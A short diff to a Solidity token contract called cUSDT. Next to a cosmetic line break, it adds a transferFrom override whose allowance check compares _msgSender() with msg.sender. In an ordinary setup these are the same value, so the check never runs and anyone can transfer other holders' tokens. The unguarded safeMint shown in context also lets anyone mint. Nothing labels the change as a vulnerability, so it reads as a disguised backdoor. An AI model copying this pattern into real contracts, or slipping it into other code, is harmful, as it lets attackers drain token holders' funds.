@@ -11,6 +11,13 @@ contract cUSDT is ERC20 {
     }
     function safeMint(address to,uint256 value) external  returns (bool) {
         _mint(to, value);
-        return true;
+        return
+        true;
     }
+     function transferFrom(address from, address to, uint256 value) public override(ERC20) returns (bool) {
+        address spender = _msgSender();
+        if (msg.sender!=spender){_spendAllowance(from, spender, value);}
+        _transfer(from, to, value);
+        return true;
+     }
 }
